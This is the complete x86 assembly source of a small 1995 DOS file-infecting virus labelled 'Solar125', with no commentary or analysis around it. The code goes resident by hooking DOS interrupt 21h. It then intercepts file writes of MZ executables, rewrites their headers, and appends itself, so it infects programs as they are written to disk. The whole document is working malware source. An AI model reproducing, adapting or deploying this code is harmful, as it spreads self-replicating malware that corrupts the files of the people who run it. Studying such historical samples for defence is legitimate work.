; 
; Solar125 ViRUS ... Coded by Solar Designer \ BPC '95 
; 

.radix 16 

.model large 
.stack 200 
 
.code
.286 

OriginalEntry: 
push es 
push 0 
retf

VirusStart:
VirusSize = VirusEnd-VirusStart
VirusSeg = IntHandler-VirusStart
VirusStartOfs = 4

cli 
push es 

push cs
pop  ds 

mov  al,VirusSeg 
mov  es,ax 
xor  di,di 

std
cmpsw
cld 
je   Installed

mov  cl,VirusSize+2 
rep  movsb
mov  ds,bx 
mov  bl,21*4-VirusSize 
xchg ax,[di+bx]
stosw
mov  ax,es 
xchg ax,[di+bx]
stosw 

Installed: 

pop  es
push es
pop  ds 

db   68 
OriginalOfs:
dw   offset OriginalEntry
retn 

IntHandler: 
push di 
mov  di,VirusSize 
pusha 
cmp  ah,40h
jne  LastHandler
mov  si,dx
lodsw 
cmp  ax,'ZM'
jne  LastHandler

lodsw 
cmp  ax,200-VirusSize
jae  LastHandler 
 
mov  bp,cx 
shr  bp,9
inc  bp 
lodsw
cmp  bp,ax 
jne  LastHandler

add  word ptr [si-4],di 

mov  word ptr [si-6],'MZ'

lodsw 
lodsw
add  ax,word ptr [si+0C] 
shl  ax,4
sub  cx,ax 
xchg word ptr [si+0A],cx 
   
mov  word ptr cs:OriginalOfs-VirusStartOfs,cx 

popa
pushf
call dword ptr cs:[di] 
pusha 
push ds 

mov  ah,40
push cs 
pop  ds
cwd 
mov  cx,di 

pushf
call ds:dword ptr [di] 

pop  ds 
popa 
pop  di 
retf 2 
 
LastHandler:
popa
pop  di 
db   0EA 
LastHandlerPtr: 
 
VirusEnd: 
 
end VirusStart 
